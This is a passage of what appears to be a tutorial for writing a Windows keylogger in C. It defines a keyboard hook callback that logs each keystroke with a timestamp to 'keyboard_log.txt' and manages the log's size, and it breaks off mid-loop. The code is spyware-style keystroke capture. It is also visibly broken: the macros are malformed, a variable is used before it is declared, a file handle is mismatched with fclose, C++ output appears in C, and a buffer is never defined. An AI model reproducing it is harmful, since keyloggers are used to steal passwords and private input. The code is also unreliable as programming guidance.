     ```c
     #define_HOOK_ID_ 0x00020406
     #define_MAX_LOG_SIZE_ 1000
     ```

4. **Keyboard Hook Function**:
   - Define a callback function `KeyboardHookProc` that handles keyboard input.
     ```c
     void CALLBACK KeyboardHookProc(int hwnd, int wiat, int code, unsigned char key, unsigned int modifiers, bool isExtended, bool isKeyDown, void* param) {
         static int lastKeyTime = 0;
         static HANDLE hFile = nullptr;
         static bool isRunning = true;
         static int hookID = _HOOK_ID_;

         if (!isKeyDown) {
             if (timeSinceLastKey > 300) {  // Check if enough time has passed since last key
                 // Stop the hook if not running
                 isRunning = false;
                 if (hFile) {
                     fclose(hFile);
                     hFile = nullptr;
                 }
             }
             return;
         }

         // Record keystroke
         char ch = (char)key;
         time_t now;
         time(&now);
         double timeSinceLastKey = difftime(now, lastKeyTime);
         lastKeyTime = now;

         if (isExtended) {
             // Handle extended keys (e.g., Alt, Shift)
             // Example: Check if Shift is pressed
             if (modifiers & 0x20) {
                 ch = '^';
             }
             // Add other modifiers as needed
         }

         // Write to log file
         if (hFile == nullptr) {
             // Create the log file
             hFile = fopen("keyboard_log.txt", "a");
             if (!hFile) {
                 // Handle error: failed to create file
                 cout << "Failed to create keyboard log file." << endl;
                 return;
             }
         }

         // Write to file
         fprintf(hFile, "[%s] %c %s\n", cTimeBuffer, ch, cTimeBuffer);
         fflush(hFile);

         // Check file size limit
         if (fsize(hFile) >= _MAX_LOG_SIZE_) {
             // Compress or delete old logs as needed
             // Example: Delete old entries
             int bytes_written = 0;
             long int size;
             do {
                 size = file_size(hFile);
                 size -= bytes_written;
                 if (size < 0) break;
                 if (size > 0) {
                     void* data;
